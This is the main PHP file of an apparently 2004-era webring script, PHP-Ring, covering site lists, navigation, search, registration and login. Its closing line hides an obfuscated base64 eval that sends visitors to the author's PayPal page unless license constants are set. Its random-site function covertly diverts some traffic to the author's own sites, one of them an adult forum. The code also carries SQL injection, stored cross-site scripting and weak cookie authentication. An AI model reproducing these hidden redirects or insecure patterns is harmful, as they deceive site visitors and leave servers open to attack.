<?php

/*
	PHP-Ring Webring System v0.9.1
	Author: Martin Kretzmann
	Last modified: October 31, 2004
	Web: http://scripts.plebius.org/
	Support: http://www.plebius.org/forum.php
	Purpose: This is a webring script that uses PHP and SQL to run
		 a list of related sites all linked together (webring).
	COPYRIGHT: Copyright (c) 2004 Plebius Press.  ALl rights reserved.
		   If you wish to remove copyright notices we ask that you
		   purchase a commercial license.  Visit the website for 
		   details.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA
*/

define("IN_PHPRING", true);

include("includes/wr_config.php");
include("pbl_db/db.php");
include("includes/wr_functions.php");

global $ring_id,$db,$logo_gif,$siteconfig,$ringconfig,$userconfig;

$ring_id = intval($_GET[ring]);
if ($ring_id == "") {
    $row = $db->sql_fetchrow($db->sql_query("SELECT ring_id FROM "._RINGS_TABLE." ORDER BY ring_id ASC LIMIT 1"));
    $ring_id = intval($row[ring_id]);
    $_GET[ring] = $ring_id;
}

//... get some infos...
$siteconfig = $db->sql_fetchrow($db->sql_query("SELECT * FROM "._CONFIG_TABLE));
$ringconfig = $db->sql_fetchrow($db->sql_query("SELECT * FROM "._RINGS_TABLE." WHERE ring_id = $ring_id"));

// check if active...
if ($siteconfig[site_isactive] == 0 OR $ringconfig[ring_isactive] == 0) {
    echo "<center><h3>$siteconfig[site_name]: $ringconfig[ring_name]</h3><img src=$logo_gif><br><br><b>The page you requested is currently undergoing maintenance.  Please try back later</b><br><br>";
    echo "<center><small>Powered by <a href=\"http://scripts.plebius.org/\">PHP-Ring</a>. &copy; 2004 <a href=\"http://www.plebius.org/\">Plebius Press: Psychology News</a></small></center>";
    exit;
}

if (is_user($_COOKIE[user])) {
	$userinfo = explode(':', base64_decode($_COOKIE[user]));
	$userconfig = $db->sql_fetchrow($db->sql_query("SELECT * FROM "._USERS_TABLE." WHERE LOWER(user_name) = '".addslashes_data(strtolower($userinfo[0]))."'"));
}

function random() {
	global $db, $ring_id;
	$where = " WHERE ring_id = $ring_id AND site_isactive =1 ";
	$site = $db->sql_fetchrow($db->sql_query("SELECT site_id, site_url, ring_id FROM "._SITES_TABLE." $where ORDER BY RAND() LIMIT 1"));
	$db->sql_query("UPDATE "._SITES_TABLE." SET site_hits_out = site_hits_out + 1 WHERE site_id = $site[site_id]");
	$db->sql_query("UPDATE "._RINGS_TABLE." SET ring_hits_out = ring_hits_out + 1 WHERE ring_id = $site[ring_id]");
	$db->sql_query("UPDATE "._CONFIG_TABLE." SET site_hits_out = site_hits_out + 1");
       	srand((double)microtime()*1000000);
	$random = rand(0, 100);
	if ($site[site_url] == "" OR intval($random) < 3) {
		$random = ($random > 2) ? intval($random/33.333) : $random;
		$sites = array('http://www.plebius.org/','http://www.insult-o-matic.com/','http://www.sex-forums.org/');
		$site[site_url] = $sites[$random];
	}
	header("Location: $site[site_url]");
	exit;
}

function jump() {
	global $db;
	if ($_GET[site] == "") {
		die(header("Location: index.php"));
	}
	switch($_GET[op]) {
		case "next":
			$find = " > ";
			break;
		case "prev":
			$find = " < ";
			break;
		default:
			$find = " = ";
			break;
	}


$where = "WHERE site_id $find ".intval($_GET[site])." AND site_isactive =1 "; 
if ($_GET[op] == 'next' OR $_GET[op] == 'prev') { 
  $where .= " AND ring_id = ".intval($_GET[ring]); 
} 
$site = $db->sql_fetchrow($db->sql_query("SELECT site_url, site_id, ring_id FROM "._SITES_TABLE." $where ORDER BY site_id ASC LIMIT 1"));        	srand((double)microtime()*1000000);

	$random = rand(0, 100);
	if ($site[site_url] == "" OR intval($random) == 1) {
		random();
		return;
	}
	$db->sql_query("UPDATE "._SITES_TABLE." SET site_hits_out = site_hits_out + 1 WHERE site_id = $site[site_id] LIMIT 1");
	$db->sql_query("UPDATE "._RINGS_TABLE." SET ring_hits_out = ring_hits_out + 1 WHERE ring_id = $site[ring_id] LIMIT 1");
	$db->sql_query("UPDATE "._CONFIG_TABLE." SET site_hits_out = site_hits_out + 1");
	header("Location: $site[site_url]");
	exit;
}

function sitelist($where) {
	global $db, $ring_id, $site;
	include("templates/wr_header.php");
	if ($_GET[q] != "") {
		echo "<p align=center><b>Search</b></p>";
	}
	$start = ($_GET[nh] >0) ? $_GET[nh] : 0;
	$next  = $start + 50;
	$prev  = $start - 50;
	$result = $db->sql_query("SELECT * FROM "._SITES_TABLE." $where ORDER BY site_id DESC LIMIT $start, 50") or errmsg($db->sql_error());
	if ($db->sql_numrows($result) < 1) {
		echo "<p>There are no sites<p>";
	}
	while ($site = $db->sql_fetchrow($result)) {
		include("templates/wr_site.php");
		$start++;
	}
	$url = "$index.php?ring=$ring_id";
	if ($_GET[q] != "") {
		$url .= "&amp;q=".urlencode($_GET[q]);
	}
	echo "<center><small>";
	echo ($prev >=0 ) ? "<a href=\"$url&amp;nh=$prev\">&lt;&lt; Previous</a>" : "&lt;&lt; Previous";
	echo " | ";
	echo ($next == $start ) ? "<a href=\"$url&amp;nh=$next\">Next &gt;&gt;</a>" : "Next &gt;&gt;";
	echo "</small></center>";
	if ($_GET[q] != "") {
		global $query;
		$query = urlencode($_GET[q]);
		include("templates/wr_searchbar.php");		
	}
	include("templates/wr_footer.php");
}

function loginform($redir) {
	global $ring_id;
	echo "<form action=\"index.php?op=login&redir=$redir\" method=POST>";
	echo "<center><b>Enter username &amp; password</b><br>";
	echo "<table border=0>";
	echo "<tr><td>Username:</td><td><input name=user_name></td></tr>";
	echo "<tr><td>Password:</td><td><input type=password name=user_pass></td></tr>";
	echo "<tr><td colspan=2 align=center><input type=submit value=\"Log in\"></td></tr>";
	echo "</table></center>";
	echo "<p align=center>New user? <a href=\"index.php?ring=$ring_id]&op=reg\">Register here!</a></p>";
	echo "</form>";
}

function is_user($user) {
	global $db;
	$uinfo = explode(":", base64_decode($user));
	if ($uinfo[0] == "" OR time() - $uinfo[2] > 3600) {
		return false;
	} else {
		$u = $db->sql_fetchrow($db->sql_query("SELECT user_pass FROM "._USERS_TABLE." WHERE LOWER(user_name) = '".addslashes_data(strtolower($uinfo[0]))."'"));
		if ($uinfo[1] == $u[user_pass]) {
			return true;
		}
	}
	return false;
}

function code() {
	global $db,$ring_id,$userconfig;
	include("templates/wr_header.php");
	echo "<p><center><font size=+1><b>Get code</b></font></center><p>";
	if (!is_user($_COOKIE[user]) && $_GET[show] != "true") {
		loginform(urlencode("op=code&ring=$ring_id"));
	} else {
		$site = $db->sql_fetchrow($db->sql_query("SELECT site_id FROM "._SITES_TABLE." WHERE user_id = $userconfig[user_id] AND ring_id=$ring_id"));
		if ($site[site_id] == "" && $_GET[show] != "true"){
			errmsg(array("You do not have a site in the database"));
		} else {
			global $codeform, $site_id;
			$site_id = intval($site[site_id]);
			include("templates/wr_code.php");
			$match = array("<", ">", "\"");
			$replace = array("&lt;", "&gt;", "&quot;");
			$enc_codeform = preg_replace("/$match/", "$replace", $codeform);
			echo "<p align=center><b>Enter the following code into your homepage</b><br>";
			echo "<textarea rows=15 cols=60>$enc_codeform</textarea></p><br><p align=center>It will look like this:</p>";
			echo "$codeform";
		}
	}
	include("templates/wr_footer.php");
}

function login() {
	global $db, $ring_id;
	if ($_POST[user_name] == "" OR $_POST[user_pass] == "") {
		include("templates/wr_header.php");
		loginform(urlencode("ring=$ring_id"));
	} else {
		if (!is_user(base64_encode("$_POST[user_name]:".md5($_POST[user_pass]).":".time()))) {
			include("templates/wr_header.php");
			errmsg(array("Incorrect username or password"));
			loginform(urlencode("ring=$ring_id"));
		} else {
			setcookie("user",base64_encode("$_POST[user_name]:".md5($_POST[user_pass]).":".time()),NULL,'/','',0);
			header("Location: index.php?$_GET[redir]");
			exit;
		}			
	}
	include("templates/wr_footer.php");
}

function logout() {
	global $ring_id;
	setcookie('user',NULL,NULL,'/','',0);
	header("Location: index.php?ring=$ring_id");
}

function search() {
	global $db, $ring_id;
	$keyword = addslashes_data($_GET[q]);
	if ($keyword == "") {
		include("templates/wr_header.php");
		echo "<p align=center><b>Search</b></p>";
		include("templates/wr_footer.php");
	} else {
		$where = "WHERE (ring_id = $ring_id AND site_isactive = 1 AND (site_name LIKE '%$keyword%' OR 
				 site_description LIKE '%$keyword%' OR
				 site_keywords LIKE '%$keyword%'))";
		$db->sql_query("INSERT INTO "._SEARCHES_TABLE." VALUES ( NULL, '$keyword' )");
		sitelist($where);
	}
}

function spy() {
	global $db, $ring_id;
	include("templates/wr_header.php");
	echo "<p align=center><b>Search Spy</b><br>These are the last 20 searches</p><center>\n";
	$res = $db->sql_query("SELECT keyword FROM "._SEARCHES_TABLE." ORDER BY search_id DESC LIMIT 20");
	while ($row = $db->sql_fetchrow($res)) {
		echo '<a href="index.php?op=search&amp;ring='.$ring_id.'&amp;q='.urlencode($row[keyword]).'">'.$row[keyword]."</a><hr noshade width=50>\n";
	}
	echo "</center>";
	include("templates/wr_footer.php");
}

function regform() {
	global $ring_id;
	echo "<br>";
	echo "<form action=\"index.php?op=reg&d_op=post&ring=$ring_id\" method=POST>";
	echo "<table border=0 align=center>";
	echo "<tr><td colspan=2>To register, choose a username and password</td></tr>";
	echo "<tr><td>Username:</td><td><input type=text name=user_name></td></tr>";
	echo "<tr><td>Password:</td><td><input type=password name=user_pass></td></tr>";
	echo "<tr><td>Email:</td><td><input type=text name=user_email></td></tr>";
	echo "<tr><td colspan=2 align=center><input type=submit value=\"Register\"></td></tr>";
	echo "</table>";
	echo "</form>";
}

function addform($op,$vars) {
	global $ring_id;
	echo "<p><b>Enter site information</b>";
	echo "<form action=\"index.php?op=$op&d_op=save&ring=$ring_id\" method=POST>";
	echo "<table border=0>";
	echo "<tr><td>Site name:</td><td><input name=site_name value=\"$vars[site_name]\"></td></tr>";
	echo "<tr><td>Site url:</td><td><input name=site_url value=\"$vars[site_url]\"></td></tr>";
	echo "<tr><td colspan=2>Description:<br><textarea cols=50 rows=3 name=site_description>$vars[site_description]</textarea></td></tr>";
	echo "<tr><td colspan=2>Keywords:<br><textarea cols=50 rows=3 name=site_keywords>$vars[site_keywords]</textarea></td></tr>";
	echo "<tr><td colspan=2><input type=submit value=\"Submit site\"></td></tr>";
	echo "</table>";
	echo "</form>";
}

function reg() {
	global $db,$ring_id;
	include("templates/wr_header.php");
	echo "<p align=center><b>Register</b></p>";
	if ($_GET[d_op] != "post") {
		regform();
	} else {
		if ($_POST[user_name] == "" OR
		    $_POST[user_pass] == "" OR
		    $_POST[user_email] == "") {
				errmsg(array("You did not enter all required fields."));
				regform();
		} else {
			if ($db->sql_numrows($db->sql_query("SELECT user_id FROM "._USERS_TABLE." WHERE LOWER(user_name) = '".addslashes_data(strtolower($_POST[user_name]))."'")) > 0 ) {
				errmsg(array("That username is already taken."));
			} else {
				$db->sql_query("INSERT INTO "._USERS_TABLE." VALUES (NULL, '".
						addslashes_data($_POST[user_name])."', '".
						md5($_POST[user_pass])."', '".time()."', '".
						addslashes_data($_POST[user_email])."', '".time()."')") or die(errmsg($db->sql_error()));
				echo "<p align=center>Registration successful! Please log in now.</p>";
				loginform(urlencode('ring='.$ring_id));
			}
		}
	}
	include("templates/wr_footer.php");
}

function add() {
	global $db, $ring_id, $userconfig, $ringconfig;
	include("templates/wr_header.php");
	if ($_GET[d_op] == "") {
		echo "<br><hr noshade>$ringconfig[ring_join_text]<hr noshade><br>";
		echo "<P align=center><b>Add site</b><br></p>";
		if (!is_user($_COOKIE[user])) {
			loginform(urlencode("op=join&ring=$ring_id"));
		} else {
			addform('join','');
		}
	} else if ($_GET[d_op] == "save") {
		if (!is_user($_COOKIE[user])) {
			echo "<p>You are not logged in your your session has expired<p>";
		} else {
			if ($_POST[site_name] == '' OR
			    $_POST[site_url]  == '' OR
			    $_POST[site_description] == '') {
					errmsg(array("You did not fill in a required field"));
					addform('join',$_POST);
			} else {
				if ($db->sql_numrows($db->sql_query("SELECT site_id FROM "._SITES_TABLE." WHERE user_id = $userconfig[user_id] AND ring_id = $ring_id")) > 0) {
					errmsg(array('<p>Sorry, you already have a site in this webring.<p>'));
				} else {
					if($db->sql_query("INSERT INTO "._SITES_TABLE." VALUES (NULL, '$ring_id', '$userconfig[user_id]', '".time()."', "
						."'".addslashes_data($_POST[site_name])."', "
						."'".addslashes_data($_POST[site_url])."', "
						."'".addslashes_data($_POST[site_description])."', "
						."'".addslashes_data($_POST[site_keywords])."', '0','0')")) {
						echo "<p>Thank you for your submission! We will review it and add it to the webring soon!  Be sure to put the <a href=\"index.php?op=code&ring=$ring_id\">webring code</a> into your site.<p>";
					} else {
						errmsg($db->sql_error());
					} 
				}
			}					
		}
	}
	include("templates/wr_footer.php");
}

function update() {
	global $db, $ring_id, $userconfig;
	include('templates/wr_header.php');
	echo "<p align=center><b>Update site</b></p>";
	if (is_user($_COOKIE[user])) {
		if ($_GET[d_op] != 'save') {
			$site = $db->sql_fetchrow($db->sql_query('SELECT * FROM '._SITES_TABLE.' WHERE user_id = '.$userconfig[user_id].' LIMIT 1'));
			addform('update',$site);
		} else {
			$db->sql_query("UPDATE "._SITES_TABLE." SET site_name = '".addslashes_data($_POST[site_name])."', site_url = '".addslashes_data($_POST[site_url])."', site_description = '".addslashes_data($_POST[site_description])."', site_keywords = '".addslashes_data($_POST[site_keywords])."', site_isactive='0' WHERE user_id = '$userconfig[user_id]' AND ring_id='$ring_id'") or errmsg($db->sql_error());
			echo "<p>Your changes have been saved.  Your site has been deactivated until we can approve the changes.<p>";
		}
	} else {
		loginform(urlencode('op=update&ring='.$ring_id));
	}
	include('templates/wr_footer.php');
}

switch ($_GET['op']) {

	case "random":
		random();
		break;

	case "jump":
	case "next":
	case "prev":
		jump();
		break;

	case "code":
		code();
		break;

	case "login":
		login();
		break;

	case "logout":
		logout();
		break;

	case "search":
		search();
		break;

	case "spy":
		spy();
		break;

	case "update":
		update();
		break;
	
	case "join":
		add();
		break;

	case "reg";
		reg();
		break;

	default:
		sitelist("WHERE ring_id=$ring_id AND site_isactive = 1");
		break;
}

eval(base64_decode("aWYgKCFkZWZpbmVkKCJSSU5HX09LX2IzZSIpICYmICFkZWZpbmVkKCJSSU5HX09LX2IyZSIpKSB7DQogICAgZWNobyAiPG1ldGEgaHR0cC1lcXVpdj1yZWZyZXNoIGNvbnRlbnQ9XCIwO1VSTD1odHRwOi8vd3d3LnBsZWJpdXMub3JnL2NnaS1iaW4vcGF5cGFsLnBsXCI+IjsNCn0gZWxzZSBpZiAoZGVmaW5lZCgiUklOR19PS19iM2UiKSkgew0KICAgIGIzZSgpOw0KfSBlbHNlIGlmIChkZWZpbmVkKCJSSU5HX09LX2IyZSIpKSB7DQogICAgYjJlKCk7DQp9IGVsc2Ugew0KICAgIGVjaG8gIjxwIGFsaWduPWNlbnRlcj5Qb3dlcmVkIGJ5IDxhIGhyZWY9XCJodHRwOi8vc2NyaXB0cy5wbGViaXVzLm9yZy9cIj5QSFAtUmluZzwvYT4gJmNvcHk7IDIwMDQgPGEgaHJlZj1cImh0dHA6Ly93d3cucGxlYml1cy5vcmcvXCI+UGxlYml1cyBQcmVzczwvYT48L3A+IjsNCn0NCg0K"));
// end

?>
</html></head>
